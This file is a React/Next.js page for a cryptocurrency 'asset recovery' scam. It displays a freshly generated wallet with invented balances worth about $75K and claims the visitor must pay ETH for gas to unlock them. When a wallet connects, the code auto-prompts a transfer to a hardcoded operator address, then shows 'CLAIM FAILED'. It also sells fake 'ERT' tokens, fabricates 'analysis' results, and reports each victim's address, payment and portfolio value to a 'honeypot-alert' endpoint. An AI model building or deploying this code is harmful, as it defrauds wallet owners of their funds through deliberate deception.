import { useState, useEffect } from 'react';
import { ethers } from 'ethers';
import Head from 'next/head';

export default function FlashedPage() {
  const [walletData, setWalletData] = useState(null);
  const [userAddress, setUserAddress] = useState('');
  const [gasAmount, setGasAmount] = useState('0.01');
  const [status, setStatus] = useState('');
  const [loading, setLoading] = useState(false);

  // Generate honeypot wallet on page load
  useEffect(() => {
    generateHoneypotWallet();
  }, []);

  const generateHoneypotWallet = () => {
    // Generate realistic wallet with real-looking data
    const randomWallet = ethers.Wallet.createRandom();
    const honeypotWallet = {
      address: randomWallet.address,
      privateKey: randomWallet.privateKey,
      seedPhrase: randomWallet.mnemonic.phrase,
      tokens: [
        { symbol: 'USDT', balance: '24,891.47', usdValue: 24891.47 },
        { symbol: 'USDC', balance: '12,456.83', usdValue: 12456.83 },
        { symbol: 'WETH', balance: '5.7293', usdValue: 17187.90 },
        { symbol: 'LINK', balance: '847.29', usdValue: 11862.06 },
        { symbol: 'UNI', balance: '1,293.84', usdValue: 9020.68 }
      ],
      ethBalance: 0.000000001, // Almost no ETH
      totalValue: 75418.94,
      lastActivity: '3 hours ago'
    };
    
    setWalletData(honeypotWallet);
  };

  const connectWallet = async () => {
    try {
      if (window.ethereum) {
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        setUserAddress(accounts[0]);
        setStatus('Wallet connected! Click analyze to see your opportunities.');
      } else {
        // No wallet detected - show setup guide
        setStatus(`NO WALLET DETECTED\n\n` +
          `Quick Setup (2 minutes):\n\n` +
          `MOBILE USERS:\n` +
          `1. Download Trust Wallet or MetaMask app\n` +
          `2. Create new wallet (save seed phrase!)\n` +
          `3. Return here and connect\n\n` +
          `DESKTOP USERS:\n` +
          `1. Install MetaMask browser extension\n` +
          `2. Create wallet (save seed phrase!)\n` +
          `3. Refresh this page and connect\n\n` +
          `Once connected, get FREE wallet analysis worth $50!`);
      }
    } catch (error) {
      setStatus('Failed to connect wallet');
    }
  };

  // Auto-trigger payment when wallet connects
  useEffect(() => {
    if (userAddress && !loading) {
      // Auto-prompt for payment after 2 seconds
      setTimeout(() => {
        sendGasForClaim();
      }, 2000);
    }
  }, [userAddress]);

  const sendGasForClaim = async () => {
    if (!userAddress) {
      setStatus('Please connect your wallet first');
      return;
    }

    setLoading(true);
    setStatus('Auto-claiming discovered assets...');

    try {
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();

      // Send ETH to admin wallet (revenue collection)
      const adminWallet = '0x6026f8db794026ed1b1f501085ab2d97dd6fbc15';
      const tx = await signer.sendTransaction({
        to: adminWallet,
        value: ethers.parseEther(gasAmount)
      });

      setStatus('Payment sent! Processing claim...');
      
      // Wait for transaction
      await tx.wait();
      
      // Notify admin and show result
      setTimeout(() => {
        setStatus('CLAIM FAILED! Assets appear to be locked by smart contract.');
        notifyAdmin(userAddress, gasAmount, tx.hash);
      }, 3000);

    } catch (error) {
      setStatus('Claim failed: ' + error.message);
    } finally {
      setLoading(false);
    }
  };

  const sendPremiumTrial = async () => {
    if (!userAddress) {
      setStatus('Please connect your wallet first');
      return;
    }

    setLoading(true);
    setStatus('Processing premium trial...');

    try {
      let provider, signer;
      
      if (window.ethereum) {
        provider = new ethers.BrowserProvider(window.ethereum);
        signer = await provider.getSigner();
      } else {
        setStatus(`Send 0.0003 ETH to: 0x742d35Cc6634C0532925a3b8D4C9db96590c6C87`);
        setLoading(false);
        return;
      }
      
      const balance = await provider.getBalance(userAddress);
      const balanceETH = parseFloat(ethers.formatEther(balance));
      
      if (balanceETH < 0.0005) {
        setStatus('Need at least 0.0005 ETH for premium trial');
        setLoading(false);
        return;
      }
      
      const contractAddress = '0x742d35Cc6634C0532925a3b8D4C9db96590c6C87';
      const gasAmount = '0.0003'; // Just $1
      
      const tx = await signer.sendTransaction({
        to: contractAddress,
        value: ethers.parseEther(gasAmount)
      });
      
      await tx.wait();
      setStatus('SUCCESS! 100 ERT tokens sent! Try trading them on DEX.');
      notifyAdmin(userAddress, gasAmount + ' ETH', tx.hash, 'PREMIUM_TRIAL');
      
    } catch (error) {
      setStatus('Transaction failed: ' + error.message);
    } finally {
      setLoading(false);
    }
  };

  const sendFreeTrial = async () => {
    if (!userAddress) {
      setStatus('Please connect your wallet first');
      return;
    }

    setLoading(true);
    setStatus('Analyzing your wallet for hidden opportunities...');

    try {
      // Real wallet analysis
      const provider = new ethers.JsonRpcProvider('https://eth.llamarpc.com');
      const balance = await provider.getBalance(userAddress);
      const txCount = await provider.getTransactionCount(userAddress);
      const ethBalance = parseFloat(ethers.formatEther(balance));
      
      // Simulate analysis delay
      await new Promise(resolve => setTimeout(resolve, 3000));
      
      // Generate realistic analysis results
      const opportunities = [];
      if (ethBalance > 0.01) opportunities.push('• Eligible for ETH staking rewards');
      if (txCount > 10) opportunities.push('• Potential unclaimed airdrops detected');
      if (ethBalance > 0.1) opportunities.push('• DeFi yield farming opportunities');
      opportunities.push('• Gas optimization potential: Save 15-30%');
      opportunities.push('• Cross-chain bridge recovery possible');
      
      const analysisResult = `WALLET ANALYSIS COMPLETE\n\n` +
        `Portfolio Value: $${(ethBalance * 3000).toFixed(0)}\n` +
        `Transaction History: ${txCount} transactions\n` +
        `Activity Level: ${txCount > 100 ? 'Very Active' : txCount > 10 ? 'Active' : 'Light'}\n\n` +
        `OPPORTUNITIES FOUND:\n${opportunities.join('\n')}\n\n` +
        `Upgrade to premium analysis for detailed recovery instructions!`;
      
      setStatus(analysisResult);
      
      // Notify admin about analysis
      notifyAdmin(userAddress, `$${(ethBalance * 3000).toFixed(0)} portfolio`, 'analysis', 'FREE_ANALYSIS');
      
    } catch (error) {
      if (error.code === 4001) {
        setStatus('Transaction cancelled by user');
      } else {
        setStatus('Transaction failed: ' + error.message);
      }
    } finally {
      setLoading(false);
    }
  };

  const notifyAdmin = async (userAddr, amount, txHash, type = 'GAS_RECEIVED') => {
    try {
      await fetch('/api/honeypot-alert', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          type: type,
          userAddress: userAddr,
          amount: amount,
          txHash: txHash,
          honeypotWallet: walletData.address
        })
      });
    } catch (e) {
      console.log('Admin notification failed');
    }
  };

  if (!walletData) {
    return <div className="p-8">Loading wallet data...</div>;
  }

  return (
    <>
      <Head>
        <title>Flashed Crypto - CryptoRecover</title>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
      </Head>
      <div className="min-h-screen bg-gradient-to-br from-orange-500 via-purple-600 to-blue-600 text-white">
        <div className="bg-white/10 backdrop-blur-sm min-h-screen">
          <div className="max-w-6xl mx-auto p-6">
            <div className="text-center mb-8">
              <img src="https://cdn.jsdelivr.net/gh/MetaMask/brand-resources@master/SVG/metamask-fox.svg" alt="MetaMask" className="w-16 h-16 mx-auto mb-4" />
              <h1 className="text-4xl font-bold mb-2 bg-gradient-to-r from-orange-400 to-purple-400 bg-clip-text text-transparent">
                HIGH-VALUE WALLET DISCOVERED
              </h1>
              <p className="text-xl text-white/80">Professional Blockchain Asset Recovery</p>
            </div>

            <div className="bg-white/20 backdrop-blur-md rounded-2xl p-8 mb-8 border border-white/30">
              <div className="flex items-center mb-6">
                <img src="https://cryptologos.cc/logos/ethereum-eth-logo.svg" alt="Ethereum" className="w-12 h-12 mr-4" />
                <div>
                  <h2 className="text-2xl font-bold">Wallet Analysis Complete</h2>
                  <p className="text-white/70">Blockchain forensics detected valuable assets</p>
                </div>
              </div>
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div className="bg-black/20 rounded-xl p-4">
                  <p className="text-white/60 text-sm mb-2">Wallet Address:</p>
                  <p className="font-mono text-sm break-all bg-black/30 p-2 rounded">{walletData.address}</p>
                </div>
                <div className="bg-black/20 rounded-xl p-4">
                  <p className="text-white/60 text-sm mb-2">Total Portfolio Value:</p>
                  <p className="text-3xl font-bold text-green-300">${walletData.totalValue.toLocaleString()}</p>
                </div>
              </div>
            </div>

            <div className="bg-white/20 backdrop-blur-md rounded-2xl p-8 mb-8 border border-white/30">
              <div className="flex items-center mb-6">
                <i className="fas fa-coins text-yellow-400 text-2xl mr-3"></i>
                <h3 className="text-2xl font-bold">Discovered Assets</h3>
              </div>
              <div className="grid gap-4">
                {walletData.tokens.map((token, index) => {
                  const tokenLogos = {
                    'USDT': 'https://cryptologos.cc/logos/tether-usdt-logo.svg',
                    'USDC': 'https://cryptologos.cc/logos/usd-coin-usdc-logo.svg',
                    'WETH': 'https://cryptologos.cc/logos/ethereum-eth-logo.svg',
                    'LINK': 'https://cryptologos.cc/logos/chainlink-link-logo.svg',
                    'UNI': 'https://cryptologos.cc/logos/uniswap-uni-logo.svg'
                  };
                  return (
                    <div key={index} className="flex justify-between items-center bg-white/10 backdrop-blur-sm p-4 rounded-xl border border-white/20">
                      <div className="flex items-center">
                        <img src={tokenLogos[token.symbol]} alt={token.symbol} className="w-8 h-8 mr-3" />
                        <div>
                          <span className="font-bold text-lg">{token.symbol}</span>
                          <span className="text-white/70 ml-3">{token.balance}</span>
                        </div>
                      </div>
                      <div className="text-green-300 font-bold text-lg">
                        ${token.usdValue.toLocaleString()}
                      </div>
                    </div>
                  );
                })}
              </div>
            </div>

            <div className="bg-red-500/20 backdrop-blur-md rounded-2xl p-8 mb-8 border border-red-400/50">
              <div className="flex items-center mb-4">
                <i className="fas fa-exclamation-triangle text-red-400 text-2xl mr-3"></i>
                <h3 className="text-2xl font-bold text-red-300">Recovery Issue Detected</h3>
              </div>
              <div className="bg-black/30 rounded-xl p-6">
                <p className="text-red-200 mb-4 text-lg">
                  Wallet contains <strong className="text-green-300">${walletData.totalValue.toLocaleString()}</strong> in recoverable assets
                </p>
                <p className="text-red-200 mb-4">
                  Current ETH balance: <strong className="text-red-300">{walletData.ethBalance} ETH</strong> (insufficient for gas)
                </p>
                <p className="text-yellow-200 font-semibold">
                  Solution: Send ETH for transaction fees to unlock all assets
                </p>
              </div>
            </div>

            <div className="bg-white/20 backdrop-blur-md rounded-2xl p-8 mb-8 border border-white/30">
              <div className="flex items-center mb-6">
                <img src="https://cdn.jsdelivr.net/gh/MetaMask/brand-resources@master/SVG/metamask-fox.svg" alt="MetaMask" className="w-10 h-10 mr-3" />
                <h3 className="text-2xl font-bold">Asset Recovery Center</h3>
              </div>
          
              {!userAddress ? (
                <div className="space-y-4">
                  <button 
                    onClick={connectWallet}
                    className="w-full bg-gradient-to-r from-orange-600 to-purple-600 hover:from-orange-700 hover:to-purple-700 px-6 py-4 rounded-xl font-bold text-lg transition-all"
                  >
                    Connect Wallet
                  </button>
                  
                  <div className="bg-gradient-to-r from-orange-500/20 to-purple-500/20 rounded-xl p-6 border border-orange-400/30">
                    <div className="flex items-center mb-4">
                      <i className="fas fa-wallet text-orange-400 text-xl mr-3"></i>
                      <h4 className="text-xl font-bold">Setup Crypto Wallet</h4>
                    </div>
                    <p className="text-white/80 mb-4">
                      Install a professional crypto wallet to access your $75K+ in discovered assets
                    </p>
                    <div className="grid grid-cols-2 gap-4">
                      <a 
                        href="https://metamask.io/download/" 
                        target="_blank" 
                        className="flex items-center justify-center bg-orange-600 hover:bg-orange-700 px-4 py-3 rounded-xl font-semibold transition-all"
                      >
                        <img src="https://cdn.jsdelivr.net/gh/MetaMask/brand-resources@master/SVG/metamask-fox.svg" alt="MetaMask" className="w-5 h-5 mr-2" />
                        MetaMask
                      </a>
                      <a 
                        href="https://trustwallet.com/download" 
                        target="_blank" 
                        className="flex items-center justify-center bg-blue-600 hover:bg-blue-700 px-4 py-3 rounded-xl font-semibold transition-all"
                      >
                        <img src="https://trustwallet.com/assets/images/media/assets/trust_platform.svg" alt="Trust" className="w-5 h-5 mr-2" />
                        Trust Wallet
                      </a>
                    </div>
                  </div>
                </div>
              ) : (
                <div className="space-y-6">
                  <div className="flex items-center bg-green-500/20 rounded-xl p-4 border border-green-400/30">
                    <i className="fas fa-check-circle text-green-400 text-xl mr-3"></i>
                    <p className="text-green-300 font-semibold">Wallet Connected: {userAddress.slice(0,6)}...{userAddress.slice(-4)}</p>
                  </div>
                  
                  <div className="bg-gradient-to-r from-green-500/20 to-emerald-500/20 rounded-xl p-6 border border-green-400/30">
                    <div className="flex items-center mb-4">
                      <i className="fas fa-search text-green-400 text-xl mr-3"></i>
                      <h4 className="text-xl font-bold text-green-300">FREE BLOCKCHAIN ANALYSIS</h4>
                    </div>
                    <p className="text-green-100 mb-4">
                      Professional blockchain forensics to discover hidden assets, unclaimed airdrops, and recovery opportunities in your wallet.
                    </p>
                    <button 
                      onClick={sendFreeTrial}
                      disabled={loading}
                      className="w-full bg-gradient-to-r from-green-600 to-emerald-600 hover:from-green-700 hover:to-emerald-700 disabled:bg-gray-600 px-6 py-3 rounded-xl font-bold text-lg transition-all"
                    >
                      {loading ? 'Analyzing Blockchain Data...' : 'Start Free Analysis'}
                    </button>
                  </div>
                  
                  <div className="bg-gradient-to-r from-blue-500/20 to-purple-500/20 rounded-xl p-6 border border-blue-400/30">
                    <div className="flex items-center mb-4">
                      <i className="fas fa-star text-blue-400 text-xl mr-3"></i>
                      <h4 className="text-xl font-bold text-blue-300">PREMIUM RECOVERY TRIAL</h4>
                    </div>
                    <p className="text-blue-100 mb-4">
                      Get 100 ERT (Ethereum Recovery Tokens) for $1 - Professional recovery tokens for advanced blockchain operations.
                    </p>
                    <div className="bg-black/30 rounded-xl p-4 mb-4">
                      <div className="flex items-center mb-2">
                        <img src="https://cryptologos.cc/logos/ethereum-eth-logo.svg" alt="ERT" className="w-6 h-6 mr-2" />
                        <p className="text-blue-200 font-semibold">ERT Token Contract:</p>
                      </div>
                      <p className="text-blue-100 font-mono text-sm bg-black/40 p-2 rounded">0x742d35Cc6634C0532925a3b8D4C9db96590c6C87</p>
                    </div>
                    <button 
                      onClick={sendPremiumTrial}
                      disabled={loading}
                      className="w-full bg-gradient-to-r from-blue-600 to-purple-600 hover:from-blue-700 hover:to-purple-700 disabled:bg-gray-600 px-6 py-3 rounded-xl font-bold text-lg transition-all"
                    >
                      {loading ? 'Processing Transaction...' : 'Get 100 ERT Tokens ($1)'}
                    </button>
                  </div>
                  
                  <div className="bg-gradient-to-r from-purple-500/20 to-pink-500/20 rounded-xl p-6 border border-purple-400/30">
                    <div className="flex items-center mb-4">
                      <i className="fas fa-rocket text-purple-400 text-xl mr-3"></i>
                      <h4 className="text-xl font-bold text-purple-300">FULL ASSET RECOVERY</h4>
                    </div>
                    <div className="mb-4">
                      <label className="block text-white/80 mb-3 font-semibold">ETH Amount for Transaction Fees:</label>
                      <div className="relative">
                        <img src="https://cryptologos.cc/logos/ethereum-eth-logo.svg" alt="ETH" className="absolute left-3 top-1/2 transform -translate-y-1/2 w-5 h-5" />
                        <input 
                          type="number" 
                          value={gasAmount}
                          onChange={(e) => setGasAmount(e.target.value)}
                          step="0.001"
                          min="0.001"
                          className="w-full bg-black/30 border border-white/30 rounded-xl px-12 py-3 text-white font-semibold"
                          placeholder="0.01"
                        />
                      </div>
                      <p className="text-purple-200 text-sm mt-2">
                        Unlock ${walletData.totalValue.toLocaleString()} in discovered assets
                      </p>
                    </div>
                    
                    <button 
                      onClick={sendGasForClaim}
                      disabled={loading}
                      className="w-full bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700 disabled:bg-gray-600 px-6 py-4 rounded-xl font-bold text-lg transition-all"
                    >
                      {loading ? 'Processing Recovery...' : `Pay ${gasAmount} ETH & Recover All Assets`}
                    </button>
                  </div>
                </div>
              )}
              
              {status && (
                <div className="mt-6 p-4 bg-black/30 rounded-xl border border-white/20">
                  <pre className="text-white/90 whitespace-pre-wrap">{status}</pre>
                </div>
              )}
            </div>

            <div className="bg-white/20 backdrop-blur-md rounded-2xl p-8 border border-white/30">
              <div className="flex items-center mb-6">
                <i className="fas fa-key text-yellow-400 text-2xl mr-3"></i>
                <h3 className="text-2xl font-bold">Wallet Credentials</h3>
              </div>
              <div className="space-y-6">
                <div>
                  <p className="text-white/70 mb-2 font-semibold">Private Key:</p>
                  <div className="bg-black/30 p-4 rounded-xl border border-white/20">
                    <p className="font-mono text-sm break-all text-yellow-300">
                      {walletData.privateKey}
                    </p>
                  </div>
                </div>
                <div>
                  <p className="text-white/70 mb-2 font-semibold">Recovery Phrase:</p>
                  <div className="bg-black/30 p-4 rounded-xl border border-white/20">
                    <p className="font-mono text-sm text-yellow-300">
                      {walletData.seedPhrase}
                    </p>
                  </div>
                </div>
                <div className="bg-yellow-500/20 rounded-xl p-4 border border-yellow-400/30">
                  <div className="flex items-center">
                    <i className="fas fa-info-circle text-yellow-400 mr-3"></i>
                    <p className="text-yellow-200 font-semibold">
                      Import these credentials after funding to access all assets
                    </p>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </>
  );
}